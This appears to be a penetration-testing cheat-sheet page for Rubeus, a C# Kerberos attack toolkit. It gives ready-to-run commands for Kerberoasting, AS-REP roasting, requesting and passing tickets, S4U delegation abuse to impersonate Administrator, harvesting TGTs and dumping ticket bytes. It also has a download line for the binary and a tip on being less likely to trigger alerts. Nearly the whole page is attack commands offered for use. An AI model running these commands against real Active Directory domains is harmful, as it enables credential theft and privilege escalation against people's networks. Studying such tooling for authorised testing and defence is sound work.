# 03.31 Rubeus

> C# toolkit for Kerberos abuse — Kerberoast, AS-REProast, Pass-the-Ticket, S4U, ticket manipulation.

## Overview

Rubeus is THE Windows-side Kerberos attack toolkit. Compiled C# binary, runs from a Windows attacker host. Implements asktgt (request TGT), kerberoast, asreproast, s4u (S4U2Self/S4U2Proxy chains for delegation), tgtdeleg, monitor (for TGT harvest), createnetonly (sacrificial process), purge.

## Steps

- **Step 1** - Compile from source or use pre-compiled binary.
- **Step 2** - Run on Windows host with domain context (current user OR createnetonly).
- **Step 3** - Pipe roasted hashes to hashcat for cracking.

## Commands

### Get binary

```powershell
# From GhostPack release page (PoC; CTF scenarios)
iwr 'https://github.com/GhostPack/Rubeus/raw/master/Rubeus/bin/Release/Rubeus.exe' -OutFile Rubeus.exe
```

### Kerberoast all SPNs

```powershell
Rubeus.exe kerberoast /outfile:kerb.txt /nowrap
Rubeus.exe kerberoast /user:<USER> /nowrap /aes              # specific user, AES-only (less alerty)
```

### AS-REP Roast (DontReqPreAuth)

```powershell
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat
Rubeus.exe asreproast /user:<USER> /outfile:asrep.txt
```

### Ask for TGT

```powershell
Rubeus.exe asktgt /user:<USER> /password:<PASS> /domain:<DOMAIN> /dc:<DC-FQDN> /nowrap
Rubeus.exe asktgt /user:<USER> /rc4:<NT-HASH> /domain:<DOMAIN> /ptt              # apply to current session
```

### Pass the Ticket

```powershell
Rubeus.exe ptt /ticket:<BASE64-OR-KIRBI>
klist                                                                              # confirm ticket loaded
```

### S4U abuse (constrained delegation)

```powershell
Rubeus.exe s4u /user:<TRUSTED-USER>$ /rc4:<NT-HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt
```

### Monitor for TGTs (unconstrained delegation harvest)

```powershell
Rubeus.exe monitor /interval:5 /filteruser:Administrator
```

### Triage / Dump / Renew

```powershell
Rubeus.exe triage                                          # list tickets in current session
Rubeus.exe dump /service:krbtgt /nowrap                    # dump ticket bytes
Rubeus.exe renew /ticket:<B64-OR-KIRBI> /autorenew
```

### createnetonly sacrificial process

```powershell
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
# Spawns hidden cmd.exe with alternate creds — kerberos ops in this shell don't use your real user
```
